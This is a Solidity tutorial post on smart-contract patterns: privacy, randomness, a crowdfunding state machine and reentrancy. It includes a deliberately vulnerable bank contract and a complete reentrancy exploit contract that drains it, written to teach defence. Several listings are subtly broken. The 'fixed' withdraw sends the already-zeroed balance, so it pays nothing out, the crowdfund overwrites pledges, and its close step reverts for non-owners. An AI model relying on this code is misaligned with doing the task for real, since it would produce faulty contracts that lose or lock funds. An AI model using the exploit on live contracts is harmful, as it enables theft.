# Hands-on: Solidity Patterns

In this material, I focused on coding patterns for Solidity. Due to the blockchain environment, some common programming practices for other languages may not be suited for a secure smart contract.

## 1. Privacy

Privacy is a big issue in the blockchain platforms, and common programming practices may not protect our information the way we are used to. Let's use for example a Bank contract (this bank could store tokens or Ether, for the coding example it does not matter).

```solidity
pragma solidity^0.4.24;
/**
 * @title Bank Unsecured (privacy compromised)
 * @author Henrique
 */
contract Bank {
    struct Client {uint id; string name; string phone; string _address; uint balance;}
    mapping(uint=>Client) private clients;
    address private owner;
     
    constructor() public{ owner = msg.sender; }
   
    function addClient(uint id, string name, string phone, string _address) public {
        require(owner == msg.sender);
        clients[id] = Client(id,name,phone,_address,0);
    }
     
    function deposit(uint id) public { }
    function withdraw(uint id, uint amount) public { }
} //end of contract
```

All information in the blockchain is public and visible to anyone. Therefore, developers must ensure data privacy by themselves. The private visibility prevents others to modify an attribute, but its contents are still visible to anyone in the blockchain. In the above example, anyone would be able to see your clients' sensible information (name, phone, address).

First rule of privacy in the blockchain is to avoid storing sensible information. To make our Bank contract more secure, we are not going to store clients information. We also are going to use the client's blockchain address for control (since it is already a hashed and public information on the blockchain). 

```solidity
pragma solidity^0.4.24;
/**
 * @title Private Bank 
 * @author Henrique
 */
contract Bank {
    struct Client {address add; uint balance;}
    mapping(address=>Client) private clients;
    address private owner;
     
    constructor() public{ owner = msg.sender; }

    function addClient(address clientAddress) public {
        require(owner == msg.sender);
        clients[clientAddress] = Client(clientAddress,0);
    }
     
    function deposit() public { }
    function withdraw(uint amount) public { }
} //end of contract
```

The most used practice to ensure data privacy is to Hash the information. A hash will have no meaning to anyone looking at. However, if we need the original data, we can use a secondary private database linking to the hash. 

## 2. Random Generation

At first glance random number generation may not seem like a problem. However, it is very tricky to create a truly random number in Solidity (if you don’t want people to cheat). 

Miners have access to many environment variables (e.g., timestamp, blockhash) and also the contract's internal state before executing your contract. Moreover, a miner can (and probably will) manipulate some of the environmnet variables to get an advantage. Therefore, we should not rely on these variables (like timestamp) to generate random numbers. 

There are many Random number generation patterns for Solidity. Each pattern varies a lot depending on the requirements and usage of the random numbers. Thus, I will not present any, I just want to reinforce the caution. Here is a [link](https://medium.com/@promentol/lottery-smart-contract-can-we-generate-random-numbers-in-solidity-4f586a152b27) to discussing a Lotery smart contract and random generation. 

## 3. State Machine

A common pattern in contracts is to make then act as a state machine. We use an ```enum``` to define the states, and an attribute to control which state the contract is currently in. A function can change the contract state into a different one. Moreover, some functions can become unavailble (or behave differntly) depending on which state the contract is.

For example, let's code a cryptocurrency Crowdfund contract. The states are very simple, when we create the contract the crowdfund is "Open". The contract can only receive pledges when it is "Open". After its expiration, if the total money raised equals or exceeds the minimum required, then the contract is "Closed" and the money is given to the person who created the crowdfund. Otherwise, the contract goes to a "refund" state, and everyone who contributed can ask for their refund. 

```solidity
pragma solidity^0.4.24;
/**
 * @title Crowdfunding contract  
 * @author Henrique
 */ 
contract CrowdFund{
    enum State { Open, Refund, Closed }
    address private owner;
    uint totalraised;
    string fundUrl;
    mapping (address=>uint) pledges;
    uint minimumRequired;
    uint expiration; //in days
    State currentState;
    
    constructor(string url, uint min, uint exp) public {
        owner = msg.sender;
        currentState = State.Open;
        fundUrl = url;
        minimumRequired = min;
        expiration = now + (exp * 1 days);
    }
    
    function contribute() public payable{
        checkExpiration();
        require(currentState == State.Open,"Cannot contribute to an expired Crowdfund.");
        pledges[msg.sender] = msg.value;
        totalraised += msg.value;
    }
    
    function refund() public {
        require(currentState == State.Refund,"Crowfund is not refunding yet.");
        uint amount = pledges[msg.sender]; 
        pledges[msg.sender]=0;
        msg.sender.transfer(amount);
    }
    
    function checkExpiration() public {
        require(currentState == State.Open,"Contract is already expired");
        if(now >= expiration){
            if(totalraised >= minimumRequired){
                currentState = State.Closed;
                getFunds();
            }
            else{
                currentState = State.Refund;
            }
        }
    }
    
    function getFunds() public {
        require(owner == msg.sender,"Only owner can get the funds.");
        require(currentState == State.Closed,"Crowdfund is not closed yet.");
        owner.transfer( address(this).balance );
    }   
} //end of contract
```

# 4. Reentrancy

Reentrancy is the name of a major security flaw in a smart contract. Much like SQL-injection, it is caused by unsecure coding practices. For example, consider the following Bank contract, in this bank people store their Ether.

```solidity
pragma solidity^0.4.24;
/**
 * @title Ether Bank Unsecured
 * @author Henrique
 */
contract Bank{
    mapping(address=>uint) private balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;    
    }
    
    function withdraw() public {
        if(msg.sender.call.value(balances[msg.sender])())
            balances[msg.sender] = 0;
    }

    function checkBalance() public view returns(uint){
        return balances[msg.sender];
    }
    
    function vault() public view returns(uint){
        return address(this).balance;
    }
} //end of contract
```

Can you identify the problem in the above contract? Don't worry if you cannot, it is tricky to see it if you are not used to Solidity. I will give you one more clue, the problem is in the withdraw function.

Any call to another address hands the control to that address. This includes any transfer of Ether. If the address is an account, nothing can happen. __However__, if the address is another contract (receiver) it can execute any code before giving back the control to the original contract. The receiver can even call the original contract again before the current function execution is resolved, therein lies the problem. 

When we use "transfer" or "send", reentrancy is not serious because these functions have a gas limition that prohibits the receiver to execute anything other than log one event. Using "call" is a different story. In the last example, we could drain all Ether from the contract by using the contract bellow.

```solidity
pragma solidity^0.4.24;
/**
 * @title Exploit Reentrancy Flaw
 * @author Henrique
 */
contract ExploitReentrancy{
    address private owner;
    Bank private bank;
    
    constructor() public{
        owner = msg.sender;
    }
    
    function setBank(address bank_address) public {
        bank = Bank(bank_address);
    }
    
    function deposit() public payable returns (uint){
        bank.deposit.value( msg.value )();
        return bank.checkBalance();
    }
    
    function getFunds() public {
        require(owner == msg.sender);
        owner.transfer( address(this).balance );
    }

    function exploit() public {
        require(owner == msg.sender);
        bank.withdraw();
    }
        
    function() public payable {
        uint balance = bank.checkBalance();
        if( address(bank).balance >= balance ){
            bank.withdraw();
        }
    }
}
```

The security issue happens in the "exploit" and fallback functions. The remaining functions are to just for set-up. In this case, the contract ExploitReentracy becames one of the Bank clients and deposits something. When we call the "exploit" function, the contract performs a bank withdraw. The withdraw function will send the funds from the Bank to ExploitReentrancy, which will trigger the execution of the fallback function before the Bank has a chance to update the balance on this address. Therefore, in the fallback we just call withdraw again, and the Bank will send our funds again and trigger another execution of the fallaback function. This will go on until we drain all Ether from the bank.

In fact, the infamous DAO attack that drained approximately 50 million dollars worth of cruptocurrency was caused by a Reentrancy flaw. The attacker probably used a contract similar to one I presented.

How can we avoid a reentrancy flaw? There is simple pattern that should always be used when calling external address. Always update the internal contract state before calling external functions (also called checks-effects-interactions pattern). Another important note is to use "transfer" or "send" instead of "call" (both transfer and send are safer by design).

For example the Bank contract bellow would not be affected by reentrancy. See that we are not forbidden someone to call the original contract again, but an attacker would not gain any benefit from doing so.

```solidity
pragma solidity^0.4.24;
/**
 * @title Ether Bank Safe Re-entrancy
 * @author Henrique
 */
contract Bank{
    mapping(address=>uint) private balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;    
    }
    
    function withdraw() public {
        uint user_balance = balances[msg.sender];
        balances[msg.sender] = 0;
        msg.sender.call.value(balances[msg.sender])();
        //Better to use transfer as shown in the line below, but even with call is safe
        //msg.sender.transfer( user_balance );
    }
    
    function checkBalance() public view returns(uint){
        return balances[msg.sender];
    }
    
    function vault() public view returns(uint){
        return address(this).balance;
    }
} //end of contract
```


